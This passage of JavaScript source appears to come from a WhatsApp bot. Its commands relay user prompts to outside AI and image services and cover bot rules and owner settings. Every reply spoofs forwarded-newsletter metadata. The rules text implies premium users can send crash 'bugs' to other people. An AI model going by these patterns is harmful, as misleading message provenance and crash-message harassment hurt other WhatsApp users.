                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
} catch (err) {
    console.log(err)
    return replygcyuta(`*${q}* isn't a valid text`)
    }
    break
    case 'blackboxai': {
	if (!text) return replygcyuta(`*• Example:* ${prefix + command} write a program to delete file`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/blackbox-ai?q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Blackbox AI\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg') }, { upload: Yuta.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Yuta.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcyuta("`*Error*`")
}
}
    break
    case 'travel-assistant': {
	if (!text) return replygcyuta(`*• Example:* ${prefix + command} how can i visit taj mahal`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/copilot2trip?q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Travel Assistant AI\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg') }, { upload: Yuta.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Yuta.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcyuta("`*Error*`")
}
}
    break
    case 'dalle': {
	if (!text) return replygcyuta(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/dalle?prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Dalle\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.result }}, { upload: Yuta.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Yuta.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcyuta("`*Error*`")
}
}
    break
    case 'guru-ai': {
	if (!text) return replygcyuta(`*• Example:* ${prefix + command} how to make girl pregnant`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/degreeGuru?q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Guru AI\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Yuta.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcyuta("`*Error*`")
}
}
    break
    case 'emi-ai': {
	if (!text) return replygcyuta(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/emi?prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Emi AI\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.result }}, { upload: Yuta.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Yuta.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcyuta("`*Error*`")
}
}
    break
    case 'claude-ai': {
	if (!text) return replygcyuta(`*• Example:* ${prefix + command} how to make girl pregnant`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/claude?q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Claude AI\n\n${gpt.result.response}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Yuta.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcyuta("`*Error*`")
}
}
    break 
    case 'hercai-cartoon': {
	if (!text) return replygcyuta(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=v3&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Cartoon\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: Yuta.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Yuta.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcyuta("`*Error*`")
}
}
    break
    case 'hercai-animefy': {
	if (!text) return replygcyuta(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=animefy&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Animefy\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: Yuta.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Yuta.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcyuta("`*Error*`")
}
}
    break
    case 'hercai-lexica': {
	if (!text) return replygcyuta(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=lexica&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Lexica\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: Yuta.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Yuta.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcyuta("`*Error*`")
}
}
    break
    case 'hercai-prodia': {
	if (!text) return replygcyuta(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=prodia&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Prodia\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: Yuta.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Yuta.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcyuta("`*Error*`")
}
}
    break
    case 'hercai-simurg': {
	if (!text) return replygcyuta(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=simurg&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Simurg\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: Yuta.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Yuta.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcyuta("`*Error*`")
}
}
    break
    case 'hercai-raava': {
	if (!text) return replygcyuta(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=raava&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Raava\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: Yuta.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Yuta.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcyuta("`*Error*`")
}
}
    break
    case 'hercai-shonin': {
	if (!text) return replygcyuta(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=shonin&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Shonin\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: Yuta.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Yuta.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcyuta("`*Error*`")
}
}
    break
    case 'realistic': case '3dmodel': {
    	if (!text) return replygcyuta(`*Example:* ${prefix + command} blue sky`)
    let lastUsed = 0;
  let currentTime = Date.now();
  if (currentTime - lastUsed < 10000) return replygcyuta("Cooldown 10 seconds, try again later")
  lastUsed = currentTime;
  try {
    let negative = 'ugly, deformed, noisy, blurry, distorted, out of focus, bad anatomy, extra limbs, poorly drawn face, poorly drawn hands, missing fingers, adult, naked, 18+';
    let gpt = await (await fetch(`https://itzpire.com/ai/${command}?prompt=${text}`)).json();
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> ${command} AI\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.result }}, { upload: Yuta.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Yuta.relayMessage(m.chat, msgs.message, {})
  } catch(e) {
    return replygcyuta("`GPT Not Responding`")
  }
}
break
case 'photoleap': {
	if (!text) return replygcyuta(`*• Example:* ${prefix + command} blue sea`);
  let currentTime = Date.now();
  let lastUsed = 0;
  if (currentTime - lastUsed < 10000) return replygcyuta("Cooldown 10 seconds, try again later");
  lastUsed = currentTime;
  try {
    let gpt = await (await fetch(`https://tti.photoleapapp.com/api/v1/generate?prompt=${text}`)).json();
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Photo Leap AI\n\n' + text
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.result_url } }, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"✨\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Yuta.relayMessage(m.chat, msgs.message, {})
  } catch(e) {
    return replygcyuta("`*Error*`");
  }
}
break
case 'ai': case 'gpt4': case 'gpt': case 'openai': {
	if (!text) return replygcyuta(`*• Example:* ${prefix + command} what is your name`);  
try {
let hasil = await fetchJson(`https://api.ryzendesu.vip/api/ai/chatgpt?text=${text}&prompt=${text}`)
let buttonnya = [{
name: "quick_reply",
buttonParamsJson: {
display_text: "👀",
id: ""
},
}]
await Yuta.sendButtonImgdf(m.chat, hasil.response, botname, null, fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg'), buttonnya, fnews, saluran, `Ai By; ${ownername}`);
} catch (err) {
try {
let gpt = await (await fetch(`https://itzpire.com/ai/gpt?model=gpt-4&q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Chat GPT\n\n' + gpt.data.response
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image:  fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Yuta.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcyuta("`*Error*`")
}}}
break
case 'lenwy': case 'lenwyai': {
try {
let lenwy = await fetchJson(`https://api-lenwy.vercel.app/lenwyai?text=${text}`)
let get = lenwy.data
let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 forwardingScore: 999,
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterJid: saluran,
 newsletterName: `By : ${ownername}`,
 serverMessageId: 143
},
 businessMessageForwardInfo: { businessOwnerJid: Yuta.decodeJid(Yuta.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: ``
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: get.result
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `┏-------[ Lenwy Ai ]-------┓`,
 subtitle: ``,
 hasMediaAttachment: true,
 ...(await prepareWAMessageMedia({ image: fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg') }, { upload: Yuta.waUploadToServer})), 
 gifPlayback: true,
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
"name": "quick_reply",
"buttonParamsJson": `{\"display_text\":\"Lewny Apakah Gw Boleh Bertanya\",\"id\":\"${prefix}lenwyai Apakah gw boleh bertanya\"}`
 },
 ],
 })
 })
 }
 }
}, { userJid: m.chat, quoted: fnews })

await Yuta.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id })
 } catch(e) {
 return replygcyuta(`maaf kak error result error\n\n${e}`)
}
}
break
case 'rules-bot': {
  const cap = `┏━━━°❀ ❬ *Rules ${botname} MultiDevice* ❭ ❀°━━━┓

1. ✧ *Dilarang Melakukan Spam Kepada Bot*, Jika Ketahuan Akan Di Banned.

2. ✧ Jika Bot Tidak Menjawab 1x, Silahkan Dicoba Lagi. Tapi Jika Bot Tidak Menjawab 2x, Itu Artinya Delay, Jangan Dipakai Dulu.

3. ✧ *Jangan Spam Bot, Kalau Belum Donasi, Sadar Diri Aja Makenya* :)

4. ✧ *Dilarang Mengirim Virtex/Bug Ke Bot*, Walaupun Tidak Ada Efeknya :v

5. ✧ *Dilarang Keras Menelpon Bot*, Jika Menelpon Akan Otomatis Diblokir.

6. ✧ Jika Tidak Mengerti Cara Menggunakan Bot, Silahkan Bertanya Pada Member Lain. Atau Jika Belum Join Group Bot, Ketik #gcbot Dan Masuk Group Bot.

7. ✧ Jika Ada Fitur Error/Tidak Mengerti Cara Menggunakannya, Silahkan Laporkan/Tanyakan Kepada Owner.

8. ✧ Jika Bot Delay, Jangan Di Spam Terlebih Dahulu.

9. ✧ Untuk User *Premium*, *Dilarang Keras Mengirim Bug Asal Ke Orang Lain*.

┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
`
replygcyuta(cap)
}
break
case 'runtime': {
            	let lowq = `*The Bot Has Been Online For:*\n*${runtime(process.uptime())}*`
                replygcyuta(lowq)
            	}
            break
			case 'xruntime': case 'testx': case 'xbot': {
				if (text && text.startsWith('--') && YutaTheCreator) {
					let buttonnya = [{
						name: 'single_select',
						buttonParamsJson: {
							title: 'SELECT',
							sections: [{
								title: 'Bot Settings',
								rows: [
									{ title: 'Anti Call On🟢', description: 'Activate Anti Call', id: '.bot anticall on' },
									{ title: 'Anti Call Off🔴', description: 'Turn off Anti Call', id: '.bot anticall off' },
									{ title: 'Auto Bio On🟢', description: 'Enable Auto Bio', id: '.bot autobio on' },
									{ title: 'Auto Bio Off🔴', description: 'Turn off Auto Bio', id: '.bot autobio off' },
									{ title: 'Auto Read On🟢', description: 'Enable Auto Read', id: '.bot autoread on' },
									{ title: 'Auto Read Off🔴', description: 'Turn off Auto Read', id: '.bot autoread off' },
									{ title: 'Auto Type On🟢', description: 'Enable Auto Type', id: '.bot autotype on' },
									{ title: 'Auto Type Off🔴', description: 'Turn off Auto Type', id: '.bot autotype off' },
									{ title: 'Read SW On🟢', description: 'Enable Read SW', id: '.bot antiswview on' },
									{ title: 'Read SW Off🔴', description: 'Turn off Read SW', id: '.bot antiswview off' },
								]
							}]
						}
					}]
					await Yuta.sendButtonMsg(m.chat, 'Bot Settings', ucpv2, 'Please select Owner🫡', null, buttonnya, m);
				} else if (text && YutaTheCreator) {
					if (text === 'anticall on') db.data.settings[botNumber].anticall = true, replygcyuta('Successfully Activating Anticall');
					if (text === 'anticall off') db.data.settings[botNumber].anticall = false, replygcyuta('Successfully Turning Off Anticall');
					if (text === 'autobio on') db.data.settings[botNumber].autobio = true, replygcyuta('Successfully Activating Autobio');
					if (text === 'autobio off') db.data.settings[botNumber].autobio = false, replygcyuta('Successfully Turning Off Autobio');
					if (text === 'autoread on') db.data.settings[botNumber].autoread = true, replygcyuta('Successfully Activating Autoread');
					if (text === 'autoread off') db.data.settings[botNumber].autoread = false, replygcyuta('Successfully Turning Off Autoread');
					if (text === 'autotype on') db.data.settings[botNumber].autotyping = true, replygcyuta('Successfully Activating Autotype');
					if (text === 'autotype off') db.data.settings[botNumber].autotyping = false, replygcyuta('Successfully Turning Off Autotype');
					if (text === 'antiswview on') db.data.settings[botNumber].readsw = true, replygcyuta('Successfully Activating Read SW');
					if (text === 'antiswview off') db.data.settings[botNumber].readsw = false, replygcyuta('Successfully Turning Off Read SW');
					let settingsBot = Object.entries(db.data.settings[botNumber]).map(([key, value]) => {
						let qhk = (typeof value === 'boolean') ? (value ? 'on🟢' : 'off🔴') : value;
						return `${key.charAt(0).toUpperCase() + key.slice(1)} : ${qhk}`;
					}).join('\n');
					if (text === 'settings') replygcyuta(settingsBot);
				} else {
					Yuta.sendMessage(m.chat, { text: `*Bots Have Been Online For*\n*${runtime(process.uptime())}*` }, { quoted: m })
				}
			}
			break
case 'ghstalk': case 'githubstalk':{
if (!q) return replygcyuta(`Example ${prefix+command} Yuta-Okkotsu`)
